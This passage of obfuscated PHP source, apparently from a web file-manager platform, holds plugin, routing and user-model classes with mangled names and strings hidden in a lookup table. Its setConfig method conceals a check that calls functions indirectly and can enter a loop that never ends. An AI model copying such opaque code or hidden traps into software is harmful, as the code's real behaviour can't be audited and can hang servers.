display($³º’¨ÙÔ) { extract($this->values); require $³º’¨ÙÔ; } final function hookRegist($¼ëìÉß…) { $this->modelPlugin->appRegist($this->pluginName, $¼ëìÉß…); } final function appIcon() { $ÓÂ±ı¡ =& $_SERVER[¹Û¹Æ€]; $ ó°Àú× = $this->appPackage(); $²Ïˆæ” = $ÓÂ±ı¡[22]; if (isset($ ó°Àú×[$ÓÂ±ı¡[425]])) { if (isset($ ó°Àú×[$ÓÂ±ı¡[425]][$ÓÂ±ı¡[1533]])) { $²Ïˆæ” = $ÓÂ±ı¡[1534] . $ ó°Àú×[$ÓÂ±ı¡[425]][$ÓÂ±ı¡[1533]] . $ÓÂ±ı¡[1535]; } else { if ($ ó°Àú×[$ÓÂ±ı¡[425]][$ÓÂ±ı¡[1536]]) { $²Ïˆæ” = $ÓÂ±ı¡[1537] . $ ó°Àú×[$ÓÂ±ı¡[425]][$ÓÂ±ı¡[1536]] . $ÓÂ±ı¡[1538]; } } } return $²Ïˆæ”; } final function fileCanView($ƒÏß¤éà) { $õò©†Ñ =& $_SERVER[¹Û¹Æ€]; if (request_url_safe($ƒÏß¤éà)) { return !0; } if ($this->isShare($ƒÏß¤éà)) { return !0; } $úŠ²‡æ» = Session::get($õò©†Ñ[1539]); if (!$úŠ²‡æ» || !$úŠ²‡æ»[$õò©†Ñ[1540]]) { $Åòôºš© = $õò©†Ñ[1541] . rawurlencode(this_url()); show_tips(LNG($õò©†Ñ[1542]) . $õò©†Ñ[1543] . $Åòôºš© . $õò©†Ñ[1544] . LNG($õò©†Ñ[1545]) . $õò©†Ñ[1546], !1); } if (!Action($õò©†Ñ[1547])->authCan($õò©†Ñ[1548])) { show_tips(LNG($õò©†Ñ[1549]) . $õò©†Ñ[1550], !1); } ActionCall($õò©†Ñ[1551], $ƒÏß¤éà); } final function isShare($ÚşÖÅ£Ô) { $ğ·¥ĞÄ€ = KodIO::parse($ÚşÖÅ£Ô); return $ğ·¥ĞÄ€[$_SERVER[¹Û¹Æ€][43]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($²ô‰Ñåì) { if (request_url_safe($²ô‰Ñåì)) { return $²ô‰Ñåì; } if (!$this->isShare($²ô‰Ñåì)) { $²ô‰Ñåì = $this->filePath($²ô‰Ñåì); } return Action($_SERVER[¹Û¹Æ€][1172])->linkOut($²ô‰Ñåì); } public function filePathLinkOut($±½‘¼¥ï) { if (request_url_safe($±½‘¼¥ï)) { return $±½‘¼¥ï; } $this->fileCanView($±½‘¼¥ï); return Action($_SERVER[¹Û¹Æ€][1172])->link($±½‘¼¥ï); } final function filePath($í£Ø°ƒ¤) { $å£ˆæ¦Á =& $_SERVER[¹Û¹Æ€]; if ($Òæ’ƒÃ¾ = $this->checkSharePath($í£Ø°ƒ¤)) { Hook::trigger($å£ˆæ¦Á[1552], $Òæ’ƒÃ¾); return $Òæ’ƒÃ¾; } $this->fileCanView($í£Ø°ƒ¤); if (request_url_safe($í£Ø°ƒ¤)) { $Õà®ì = parse_url_query($í£Ø°ƒ¤); if (isset($Õà®ì[$å£ˆæ¦Á[1553]]) && isset($Õà®ì[$å£ˆæ¦Á[223]])) { $ÎÇø“ßó = Model($å£ˆæ¦Á[768])->get($å£ˆæ¦Á[769]); $Äè´í = Mcrypt::decode($Õà®ì[$å£ˆæ¦Á[223]], $ÎÇø“ßó); if ($Äè´í) { $this->fileInfo = IO::infoWithChildren($Äè´í); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $Äè´í; } } $í£Ø°ƒ¤ = $this->_cacheHttpFile($í£Ø°ƒ¤); $this->fileInfo = IO::infoWithChildren($í£Ø°ƒ¤); } else { $this->fileInfo = IO::infoWithChildren($í£Ø°ƒ¤); if (!$this->fileInfo) { show_tips(LNG($å£ˆæ¦Á[115]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($å£ˆæ¦Á[1552], $í£Ø°ƒ¤); return $í£Ø°ƒ¤; } final function _cacheHttpFile($›À¡î) { $Ææ…¨ = hash_path($›À¡î, !0); $this->cachePath = $this->pluginCachePath($Ææ…¨); if ($êÕû±Šï = IO::fileNameExist($this->cachePath, $Ææ…¨)) { return KodIO::make($êÕû±Šï); } $¢Ò„˜Ì = $this->cachePath . $Ææ…¨; return $this->pluginCacheFileSet($¢Ò„˜Ì, file_get_contents_nossl($›À¡î)); } final function _tmpFileName($¦¾½¼æØ = array()) { $“˜é™¬ =& $_SERVER[¹Û¹Æ€]; if (!$¦¾½¼æØ) { $¦¾½¼æØ = $this->fileInfo; } if (isset($¦¾½¼æØ[$“˜é™¬[187]])) { return $¦¾½¼æØ[$“˜é™¬[187]]; } if (isset($¦¾½¼æØ[$“˜é™¬[180]][$“˜é™¬[187]])) { return $¦¾½¼æØ[$“˜é™¬[180]][$“˜é™¬[187]]; } $–Ü–Ó = IO::hashSimple($¦¾½¼æØ[$“˜é™¬[94]]); if ($–Ü–Ó) { return $–Ü–Ó; } $Ø’Ñ×Ò = array($¦¾½¼æØ[$“˜é™¬[42]], $¦¾½¼æØ[$“˜é™¬[94]], $¦¾½¼æØ[$“˜é™¬[86]]); if (isset($¦¾½¼æØ[$“˜é™¬[530]])) { $Ø’Ñ×Ò[] = $¦¾½¼æØ[$“˜é™¬[530]]; } return md5(implode($“˜é™¬[21], $Ø’Ñ×Ò)); } final function checkSharePath($œ¹“À½Ë) { $Ê³¹¹ÀÏ =& $_SERVER[¹Û¹Æ€]; if (!defined($Ê³¹¹ÀÏ[484])) { define($Ê³¹¹ÀÏ[523], 0); } if (!$this->isShare($œ¹“À½Ë)) { return !1; } $Êûë…‰’ = Action($Ê³¹¹ÀÏ[1172])->sharePathInfo($œ¹“À½Ë); if (!isset($Êûë…‰’[$Ê³¹¹ÀÏ[94]])) { show_json(LNG($Ê³¹¹ÀÏ[1554]), !1); } $this->fileInfo = $Êûë…‰’[$Ê³¹¹ÀÏ[180]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$Ê³¹¹ÀÏ[187]]); return $Êûë…‰’[$Ê³¹¹ÀÏ[94]]; } final function pluginCachePath($ÜÑ¡’‘­ = '') { $ïÓ¦—ğ =& $_SERVER[¹Û¹Æ€]; $ó¡È¨†Œ = IO_PATH_SYSTEM_TEMP . $ïÓ¦—ğ[1555] . $this->pluginName; if (!($„«ŸÀôñ = IO::infoFull($ó¡È¨†Œ))) { return IO::mkdir($ó¡È¨†Œ . $ïÓ¦—ğ[18] . $ÜÑ¡’‘­); } if (empty($ÜÑ¡’‘­)) { return $„«ŸÀôñ[$ïÓ¦—ğ[94]]; } if (!($ËÎá×£ø = IO::fileNameExist($„«ŸÀôñ[$ïÓ¦—ğ[94]], $ÜÑ¡’‘­))) { return IO::mkdir($„«ŸÀôñ[$ïÓ¦—ğ[94]] . $ÜÑ¡’‘­); } return KodIO::make($ËÎá×£ø); } final function pluginCacheFileSet($¾»ÁÕ·ó, $ÍÃçúÆË = '') { $”ˆàŠø =& $_SERVER[¹Û¹Æ€]; if (!($Ü°“±å÷ = IO::infoFull($¾»ÁÕ·ó))) { return IO::mkfile($¾»ÁÕ·ó, $ÍÃçúÆË, REPEAT_REPLACE); } IO::setContent($Ü°“±å÷[$”ˆàŠø[94]], $ÍÃçúÆË); return $Ü°“±å÷[$”ˆàŠø[94]]; } final function pluginLocalFile($Èæò’±· = '') { $š®­™’Ü =& $_SERVER[¹Û¹Æ€]; $„Ï›·äŒ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($„Ï›·äŒ)) { mk_dir($„Ï›·äŒ); } if (!$Èæò’±·) { return $„Ï›·äŒ; } $Ü¾øÏ†ñ = IO::info($Èæò’±·); $Ô§›ËÊ± = $this->_tmpFileName($Ü¾øÏ†ñ) . $š®­™’Ü[20] . $Ü¾øÏ†ñ[$š®­™’Ü[184]]; if (!checkExtSafe($Ô§›ËÊ±)) { $Ô§›ËÊ± = $Ô§›ËÊ± . $š®­™’Ü[1204]; } $‚¦è¦şÛ = $„Ï›·äŒ . $Ô§›ËÊ±; if (@file_exists($‚¦è¦şÛ)) { return $‚¦è¦şÛ; } return IO::copy($Èæò’±·, $„Ï›·äŒ, 0, $Ô§›ËÊ±); } final function appPackage() { $Ê¨îÃº… =& $_SERVER[¹Û¹Æ€]; if ($this->packageData) { return $this->packageData; } $•Ñø¨ÒŞ = $this->parseFile($this->pluginPath . $Ê¨îÃº…[1556]); $this->parseLang($•Ñø¨ÒŞ); $ÊÉ÷‹²‡ = json_decode_force($•Ñø¨ÒŞ); if (!$ÊÉ÷‹²‡) { return array(); } $¡Œ“÷ã’ = Hook::trigger($Ê¨îÃº…[1557], $ÊÉ÷‹²‡); if ($¡Œ“÷ã’ && is_array($¡Œ“÷ã’)) { $ÊÉ÷‹²‡ = $¡Œ“÷ã’; } $this->packageData = $ÊÉ÷‹²‡; return $ÊÉ÷‹²‡; } public function packageInfoGet($³‹Á›‹î) { $¾‰–´­— = $this->appPackage(); return array_get_value($¾‰–´­—, $³‹Á›‹î); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¹Û¹Æ€][1558]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¹Û¹Æ€][1559]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¹Û¹Æ€][1560]); } public function echoJsAssign($ÖˆĞÜïË, $‰Š¸Ù) { $this->echoJsAssignArr[$ÖˆĞÜïË] = $‰Š¸Ù; } private function parseFile($ÓÄÁ„¹) { $çÏ¨³™¯ =& $_SERVER[¹Û¹Æ€]; $¨½ğæª™ = file_get_contents_nossl($ÓÄÁ„¹); $¬ı˜„œ = array($çÏ¨³™¯[1561], $çÏ¨³™¯[1562], $çÏ¨³™¯[1563], $çÏ¨³™¯[1564], $çÏ¨³™¯[1565], $çÏ¨³™¯[1566], $çÏ¨³™¯[1567]); $˜Ç¹Éû = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$çÏ¨³™¯[99]][$çÏ¨³™¯[1568]]); foreach ($this->echoJsAssignArr as $ÇÌÂÕÙ© => $Àì‰ôÏ÷) { $¬ı˜„œ[] = $çÏ¨³™¯[1569] . $ÇÌÂÕÙ© . $çÏ¨³™¯[1570]; $˜Ç¹Éû[] = is_array($Àì‰ôÏ÷) || is_object($Àì‰ôÏ÷) ? rawurlencode(json_encode($Àì‰ôÏ÷)) : $Àì‰ôÏ÷; } if (strstr($¨½ğæª™, $çÏ¨³™¯[1571])) { $Õß¿§Í‰ = rawurlencode(json_encode($this->pluginLangArr)); $¨½ğæª™ = str_replace($çÏ¨³™¯[1571], $Õß¿§Í‰, $¨½ğæª™); } if (strstr($¨½ğæª™, $çÏ¨³™¯[1572])) { $Õß¿§Í‰ = $Õß¿§Í‰ = rawurlencode(json_encode($this->getConfig())); $¨½ğæª™ = str_replace($çÏ¨³™¯[1572], $Õß¿§Í‰, $¨½ğæª™); } $¨½ğæª™ = str_replace($¬ı˜„œ, $˜Ç¹Éû, $¨½ğæª™); return $¨½ğæª™; } private function parseLang(&$Êû³Á§È) { $—øòñ¥“ =& $_SERVER[¹Û¹Æ€]; $ÔÚ ® = $—øòñ¥“[1573]; if (!strstr($Êû³Á§È, $ÔÚ ®)) { return; } preg_match_all($—øòñ¥“[1574], $Êû³Á§È, $ ÔØ—Ù¼); if (!is_array($ ÔØ—Ù¼) || count($ ÔØ—Ù¼) == 0 || !is_array($ ÔØ—Ù¼[0]) || count($ ÔØ—Ù¼[0]) == 0) { return; } $ÓÏ´ºÔŞ = array(); $ÜŞùÊ¶ = array(); foreach ($ ÔØ—Ù¼[0] as $×›ÂµÎÈ) { $£áì†·« = substr($×›ÂµÎÈ, strlen($ÔÚ ®), -4); $éÒ¿¦Å¹ = LNG($£áì†·«); $ÓÏ´ºÔŞ[] = $×›ÂµÎÈ; $ÜŞùÊ¶[] = str_replace(array($—øòñ¥“[12], $—øòñ¥“[1075], $—øòñ¥“[351], $—øòñ¥“[128]), array($—øòñ¥“[63], $—øòñ¥“[63], $—øòñ¥“[22], $—øòñ¥“[1575]), $éÒ¿¦Å¹); } $Êû³Á§È = str_replace($ÓÏ´ºÔŞ, $ÜŞùÊ¶, $Êû³Á§È); } private function parseConfig(&$Å•œßÁÆ) { $²˜„¥Ö¿ =& $_SERVER[¹Û¹Æ€]; $í”ÒÑ¯ë = $²˜„¥Ö¿[1576]; if (!strstr($Å•œßÁÆ, $í”ÒÑ¯ë)) { return; } preg_match_all($²˜„¥Ö¿[1577], $Å•œßÁÆ, $åŞâÜõË); if (!is_array($åŞâÜõË) || count($åŞâÜõË) == 0 || !is_array($åŞâÜõË[0]) || count($åŞâÜõË[0]) == 0) { return; } $“ ªÔˆË = $this->getConfig(); $ÉÅæìƒ’ = array(); $âò¶ÃËƒ = array(); foreach ($åŞâÜõË[0] as $÷§ùÄòë) { $Ù…çìÖ = substr($÷§ùÄòë, strlen($í”ÒÑ¯ë), -2); $ÉÅæìƒ’[] = $÷§ùÄòë; $âò¶ÃËƒ[] = _get($“ ªÔˆË, $Ù…çìÖ); } $Å•œßÁÆ = str_replace($ÉÅæìƒ’, $âò¶ÃËƒ, $Å•œßÁÆ); } private function parsePackage(&$ƒ±Ùã¼Õ) { $Ÿ¼ğØú” =& $_SERVER[¹Û¹Æ€]; $ÜË‚…õ = $Ÿ¼ğØú”[1578]; if (!strstr($ƒ±Ùã¼Õ, $ÜË‚…õ)) { return; } preg_match_all($Ÿ¼ğØú”[1579], $ƒ±Ùã¼Õ, $õŞÌ„Í¢); if (!is_array($õŞÌ„Í¢) || count($õŞÌ„Í¢) == 0 || !is_array($õŞÌ„Í¢[0]) || count($õŞÌ„Í¢[0]) == 0) { return; } $Œ›™õÄ¨ = $this->appPackage(); $§ô’§’® = array(); $²†ëø÷ = array(); foreach ($õŞÌ„Í¢[0] as $ğ„”Õ´„) { $Ïí•¥² = substr($ğ„”Õ´„, strlen($ÜË‚…õ), -2); $§ô’§’®[] = $ğ„”Õ´„; $²†ëø÷[] = _get($Œ›™õÄ¨, $Ïí•¥²); } $ƒ±Ùã¼Õ = str_replace($§ô’§’®, $²†ëø÷, $ƒ±Ùã¼Õ); } final function echoFile($íğğõêÖ, $†Ò•ü® = false) { $¾øÑåûÇ =& $_SERVER[¹Û¹Æ€]; $ğËÌçÖí = $this->pluginPath . $íğğõêÖ; if (ACT == $¾øÑåûÇ[1580]) { echo $¾øÑåûÇ[1581] . $this->pluginName . $¾øÑåûÇ[18] . $íğğõêÖ . $¾øÑåûÇ[1582]; if (!file_exists($ğËÌçÖí)) { echo $¾øÑåûÇ[1583]; return; } } $İŒ–Ï = $this->parseFile($ğËÌçÖí); $this->parseLang($İŒ–Ï); $this->parseConfig($İŒ–Ï); $this->parsePackage($İŒ–Ï); if (is_array($†Ò•ü®)) { $İŒ–Ï = str_replace(array_keys($†Ò•ü®), array_values($†Ò•ü®), $İŒ–Ï); } echo $¾øÑåûÇ[12] . $İŒ–Ï; } final function initLang() { $ş¥Ÿ‡¸ =& $_SERVER[¹Û¹Æ€]; $š¿°éĞĞ = $ş¥Ÿ‡¸[1584]; $ŞåşÉ‡Á = $this->pluginPath . $ş¥Ÿ‡¸[1585]; $‹¤è¬ü = I18n::getType(); $ÏÀáòší = array(); if (file_exists($ŞåşÉ‡Á . $‹¤è¬ü . $ş¥Ÿ‡¸[836])) { $ÏÀáòší = (include $ŞåşÉ‡Á . $‹¤è¬ü . $ş¥Ÿ‡¸[836]); } else { if ($‹¤è¬ü == $ş¥Ÿ‡¸[1586] && !file_exists($ŞåşÉ‡Á . $‹¤è¬ü . $ş¥Ÿ‡¸[836]) && file_exists($ŞåşÉ‡Á . $ş¥Ÿ‡¸[1587])) { $ÏÀáòší = (include $ŞåşÉ‡Á . $ş¥Ÿ‡¸[1587]); } else { if (file_exists($ŞåşÉ‡Á . $š¿°éĞĞ . $ş¥Ÿ‡¸[836])) { $ÏÀáòší = (include $ŞåşÉ‡Á . $š¿°éĞĞ . $ş¥Ÿ‡¸[836]); } } } if (!is_array($ÏÀáòší)) { return array(); } if (@count($ÏÀáòší) > 0) { I18n::set($ÏÀáòší); } return $ÏÀáòší; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ûêÈÌàÏ) { $ã„Šàõ =& $_SERVER[¹Û¹Æ€]; if (!isset($_SERVER[$ã„Šàõ[8]]) || !isset($_SERVER[$ã„Šàõ[6]])) { $ÓºÜâ–í = $ã„Šàõ[874]; $Ñï†Æ¢ç = $ã„Šàõ[9]; $Á–†²¢Í = $_SERVER[$ã„Šàõ[10]] . $ã„Šàõ[11]; $š†Ò«ï¯ = $Ñï†Æ¢ç($Á–†²¢Í); $Ëó²ùğë = explode($ã„Šàõ[12], $š†Ò«ï¯); if (count($Ëó²ùğë) < $ã„Šàõ[656]) { $¸Ó™»õ = $ã„Šàõ[14]; $¸Ó™»õ(); } $ˆè«ÊÕÜ = $ã„Šàõ[875]; $ˆè«ÊÕÜ($_SERVER[$ã„Šàõ[876]]); $»éôãßı = 1; for ($ƒ·ĞÑ¡ë = $»éôãßı; $ƒ·ĞÑ¡ë > 0; $ƒ·ĞÑ¡ë++) { $ˆè«ÊÕÜ = json_encode($GLOBALS[$ã„Šàõ[427]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ûêÈÌàÏ); } public function onSetConfig($¿†«‹ˆÒ) { } public function onGetConfig($û×«Íşî) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($–ãÛÀòå) { if ($–ãÛÀòå == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($˜áğ© = "\160\x6c\165\147\x69\156\101\165\164\150") { $Ø¿Õîó =& $_SERVER[¹Û¹Æ€]; if (!defined($Ø¿Õîó[484])) { return !1; } if (_get($GLOBALS, $Ø¿Õîó[512])) { return !0; } $ßÄƒæ¾ = $this->getConfig(); if (!$ßÄƒæ¾[$˜áğ©]) { return !1; } return ActionCall($Ø¿Õîó[1588], $ßÄƒæ¾[$˜áğ©]); } public function url($†³ãîÙË, $ÒÍ¸óÜ… = '', $ãš²²˜ = true) { $…ğ›‰Š =& $_SERVER[¹Û¹Æ€]; $Ù÷ÚÉ“ = $this->getConfig(); $Ş”ôíİ = KOD_VERSION . $…ğ›‰Š[20] . KOD_VERSION_BUILD; $ö¦Öêş = $this->packageVersion(); $ùß´®†× = $Ş”ôíİ . $…ğ›‰Š[395] . $ö¦Öêş; if (substr($†³ãîÙË, 0, 4) == $…ğ›‰Š[158] || substr($†³ãîÙË, 0, 2) == $…ğ›‰Š[1373]) { $€—ãˆƒ¼ = $†³ãîÙË . $…ğ›‰Š[1589] . $ùß´®†×; } else { if ($ÒÍ¸óÜ… == $…ğ›‰Š[22]) { $€—ãˆƒ¼ = $this->pluginHost . $†³ãîÙË . $…ğ›‰Š[1589] . $ùß´®†×; } else { if ($ÒÍ¸óÜ… === $…ğ›‰Š[85]) { $€—ãˆƒ¼ = $this->pluginHost . $†³ãîÙË; } else { if ($ÒÍ¸óÜ… == $…ğ›‰Š[1590]) { $€—ãˆƒ¼ = STATIC_PATH . $†³ãîÙË . $…ğ›‰Š[1589] . $Ş”ôíİ; } else { if ($ÒÍ¸óÜ… == $…ğ›‰Š[1591]) { $€—ãˆƒ¼ = APP_HOST . $…ğ›‰Š[1592] . $†³ãîÙË . $…ğ›‰Š[1589] . $Ş”ôíİ; } else { if (isset($Ù÷ÚÉ“[$ÒÍ¸óÜ…])) { $€—ãˆƒ¼ = $Ù÷ÚÉ“[$ÒÍ¸óÜ…] . $†³ãîÙË . $…ğ›‰Š[1589] . $ùß´®†×; } } } } } } if (!$ãš²²˜) { return $€—ãˆƒ¼; } echo $€—ãˆƒ¼; } public function link($›õÁê = false, $®ºñ–æÁ = '') { $–µÏÎ§Æ =& $_SERVER[¹Û¹Æ€]; if (!$›õÁê) { $this->link($–µÏÎ§Æ[1593], $–µÏÎ§Æ[1591]); $this->link($–µÏÎ§Æ[1594], $–µÏÎ§Æ[1590]); $this->link($–µÏÎ§Æ[1595], $–µÏÎ§Æ[1590]); $this->link($–µÏÎ§Æ[1596], $–µÏÎ§Æ[1590]); $this->link($–µÏÎ§Æ[1597], $–µÏÎ§Æ[1590]); return; } $ñ¬Ò¶Û = $this->url($›õÁê, $®ºñ–æÁ, !1); if (substr($›õÁê, -3) == $–µÏÎ§Æ[1598]) { echo $–µÏÎ§Æ[1599] . $ñ¬Ò¶Û . $–µÏÎ§Æ[1600] . $–µÏÎ§Æ[12]; } else { if (substr($›õÁê, -4) == $–µÏÎ§Æ[1601]) { echo $–µÏÎ§Æ[1602] . $ñ¬Ò¶Û . $–µÏÎ§Æ[1603] . $–µÏÎ§Æ[12]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\x79" => "\x5b\x5e\57\135\x2b", "\72\x6e\x75\155" => "\x5b\60\x2d\x39\135\x2b", "\72\141\154\154" => "\56\52"); public static $errorCallback; public static function __callstatic($ûÊüà¤ú, $²ã²ÁÊ) { $ğ¤ ó°­ =& $_SERVER[¹Û¹Æ€]; if ($ûÊüà¤ú == $ğ¤ ó°­[1604]) { $ö‰€½ëº = array_map($ğ¤ ó°­[1605], $²ã²ÁÊ[0]); $ÒÈ­Íü = strpos($²ã²ÁÊ[1], $ğ¤ ó°­[18]) === 0 ? $²ã²ÁÊ[1] : $ğ¤ ó°­[18] . $²ã²ÁÊ[1]; $¨ÉÄ™œü = $²ã²ÁÊ[2]; } else { $ö‰€½ëº = null; $ÒÈ­Íü = strpos($²ã²ÁÊ[0], $ğ¤ ó°­[18]) === 0 ? $²ã²ÁÊ[0] : $ğ¤ ó°­[18] . $²ã²ÁÊ[0]; $¨ÉÄ™œü = $²ã²ÁÊ[1]; } array_push(self::$maps, $ö‰€½ëº); array_push(self::$routes, $ÒÈ­Íü); array_push(self::$methods, strtoupper($ûÊüà¤ú)); array_push(self::$callbacks, $¨ÉÄ™œü); } public static function error($²’İç»ã) { self::$errorCallback = $²’İç»ã; } public static function haltOnMatch($°éç§Á = true) { self::$halts = $°éç§Á; } public static function dispatch() { $ÔÎî–Úœ =& $_SERVER[¹Û¹Æ€]; $Ó‘ëÔ¯ = parse_url($_SERVER[$ÔÎî–Úœ[1606]], PHP_URL_PATH); $ÕÒµÀ©ô = $_SERVER[$ÔÎî–Úœ[169]]; $ó®‹æ«Á = array_keys(static::$patterns); $ÖÚÀé¶÷ = array_values(static::$patterns); $˜Ÿ¾Ñè = !1; self::$routes = preg_replace($ÔÎî–Úœ[1274], $ÔÎî–Úœ[18], self::$routes); if (in_array($Ó‘ëÔ¯, self::$routes)) { $‰óÑÏİº = array_keys(self::$routes, $Ó‘ëÔ¯); foreach ($‰óÑÏİº as $ï¯çËà) { if (self::$methods[$ï¯çËà] == $ÕÒµÀ©ô || self::$methods[$ï¯çËà] == $ÔÎî–Úœ[1607] || in_array($ÕÒµÀ©ô, self::$maps[$ï¯çËà])) { $˜Ÿ¾Ñè = !0; if (!is_object(self::$callbacks[$ï¯çËà])) { $ù°†ü¡¦ = explode($ÔÎî–Úœ[18], self::$callbacks[$ï¯çËà]); $©ÜŠŒ¨ = end($ù°†ü¡¦); $¯¸Ú¸õŠ = explode($ÔÎî–Úœ[1206], $©ÜŠŒ¨); $—üøü€Ã = new $¯¸Ú¸õŠ[0](); $—üøü€Ã->{$¯¸Ú¸õŠ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ï¯çËà]); if (self::$halts) { return; } } } } } else { $ÇÏü™ß = 0; foreach (self::$routes as $ï¯çËà) { if (strpos($ï¯çËà, $ÔÎî–Úœ[4]) !== !1) { $ï¯çËà = str_replace($ó®‹æ«Á, $ÖÚÀé¶÷, $ï¯çËà); } if (preg_match($ÔÎî–Úœ[1608] . $ï¯çËà . $ÔÎî–Úœ[1609], $Ó‘ëÔ¯, $Ç‹è£›)) { if (self::$methods[$ÇÏü™ß] == $ÕÒµÀ©ô || self::$methods[$ÇÏü™ß] == $ÔÎî–Úœ[1607] || !empty(self::$maps[$ÇÏü™ß]) && in_array($ÕÒµÀ©ô, self::$maps[$ÇÏü™ß])) { $˜Ÿ¾Ñè = !0; array_shift($Ç‹è£›); if (!is_object(self::$callbacks[$ÇÏü™ß])) { $ù°†ü¡¦ = explode($ÔÎî–Úœ[18], self::$callbacks[$ÇÏü™ß]); $©ÜŠŒ¨ = end($ù°†ü¡¦); $¯¸Ú¸õŠ = explode($ÔÎî–Úœ[1206], $©ÜŠŒ¨); $—üøü€Ã = new $¯¸Ú¸õŠ[0](); if (!method_exists($—üøü€Ã, $¯¸Ú¸õŠ[1])) { echo $ÔÎî–Úœ[1610]; } else { call_user_func_array(array($—üøü€Ã, $¯¸Ú¸õŠ[1]), $Ç‹è£›); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ÇÏü™ß], $Ç‹è£›); if (self::$halts) { return; } } } } $ÇÏü™ß++; } } if ($˜Ÿ¾Ñè == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $†¼‘¬Ñê =& $_SERVER[¹Û¹Æ€]; header($_SERVER[$†¼‘¬Ñê[1611]] . $†¼‘¬Ñê[1612]); echo $†¼‘¬Ñê[1613]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ÔÎî–Úœ[1606]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto a¯„²ñÆ×; f“œÔÄİÌ: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\x2e\x6a\157\x62\114\x69\x73\x74"; public $field = array("\156\141\x6d\x65", "\144\145\x73\143", "\163\157\162\x74"); const JOB_KEY = "\x73\145\154\146\112\x6f\x62\x4c\x69\x73\x74"; public function listData($À¢íÁ¼ù = false, $©ÂƒËÍ = "\x73\157\x72\x74", $ùÁèƒÙ = false) { return parent::listData($À¢íÁ¼ù, $©ÂƒËÍ, $ùÁèƒÙ); } public function remove($•©ä“‰¸) { return parent::remove($•©ä“‰¸); } public function add($òŸô¦Ş×) { $Ìïâ¨ùü =& $_SERVER[¹Û¹Æ€]; if ($this->findByName($òŸô¦Ş×[$Ìïâ¨ùü[42]])) { return !1; } $òŸô¦Ş×[$Ìïâ¨ùü[1873]] = $this->getSort(); return parent::insert($òŸô¦Ş×); } private function getSort() { $ÓÆÛ’…§ =& $_SERVER[¹Û¹Æ€]; $ôŸä˜èü = parent::listData(); $µ€¬Òã‹ = array_to_keyvalue($ôŸä˜èü, $ÓÆÛ’…§[22], $ÓÆÛ’…§[1873]); return empty($µ€¬Òã‹) ? 0 : max($µ€¬Òã‹) + 1; } public function update($”®äò½‡, $¼ñË—¡Ã) { $óîÓêÁ =& $_SERVER[¹Û¹Æ€]; $øßÇ™Â = parent::listData($”®äò½‡); $à€İ‹ˆ  = $this->findByName($¼ñË—¡Ã[$óîÓêÁ[42]]); if (!$øßÇ™Â || $à€İ‹ˆ  && $à€İ‹ˆ [$óîÓêÁ[408]] != $øßÇ™Â[$óîÓêÁ[408]]) { return !1; } return parent::update($”®äò½‡, $¼ñË—¡Ã); } public function setUserJob($Ê×ô“Ûå, $ùÉÛÊÙ©) { $Òûë´ÎÎ =& $_SERVER[¹Û¹Æ€]; if (!is_array($ùÉÛÊÙ©)) { $ùÉÛÊÙ© = array($ùÉÛÊÙ©); } $¨ô—´©× = parent::listData(); $”¤±Ú¦ = array_to_keyvalue($¨ô—´©×, $Òûë´ÎÎ[42]); $û±úıê = $Òûë´ÎÎ[387]; foreach ($ùÉÛÊÙ© as $À‘±÷) { if ($”¤±Ú¦[$À‘±÷]) { $û±úıê .= $”¤±Ú¦[$À‘±÷][$Òûë´ÎÎ[408]] . $Òûë´ÎÎ[60]; } else { $ƒ²ÁÅ = $this->add($À‘±÷); $û±úıê .= $ƒ²ÁÅ . $Òûë´ÎÎ[60]; } } $û±úıê = rtrim($û±úıê, $Òûë´ÎÎ[60]); Model($Òûë´ÎÎ[544])->metaSet($Ê×ô“Ûå, self::JOB_KEY, $û±úıê); } public function getUserJob($ àÃ…ú°) { $Ù¿çñ¦  = Model($_SERVER[¹Û¹Æ€][544])->metaGet($ àÃ…ú°); return $this->getUserJobInfo($Ù¿çñ¦ [self::JOB_KEY]); } public function getUserJobInfo($ß¯˜€Ê¥) { $™«íààŞ =& $_SERVER[¹Û¹Æ€]; $—áóÇå = explode($™«íààŞ[60], $ß¯˜€Ê¥); $ÏâÉ‹ãœ = parent::listData(); $ÏâÉ‹ãœ = array_remove_key($ÏâÉ‹ãœ, $™«íààŞ[210]); $€»äá…í = array(); foreach ($—áóÇå as $•ÔõÙ¡î) { if (isset($ÏâÉ‹ãœ[$•ÔõÙ¡î])) { $€»äá…í[] = $ÏâÉ‹ãœ[$•ÔõÙ¡î]; } } return $€»äá…í; } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\145\x72"; protected $tableMeta = array("\164\x61\142\154\145\116\141\155\145" => "\165\163\145\162\137\155\145\164\141", "\155\145\164\x61\x46\x69\145\154\144" => "\x75\163\x65\x72\111\x44"); protected $simpleField = "\x75\163\145\162\x49\104\54\156\151\x63\153\116\x61\x6d\145\x2c\156\x61\155\145\54\x61\166\141\164\141\x72\x2c\163\145\170\54\163\x74\141\164\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL 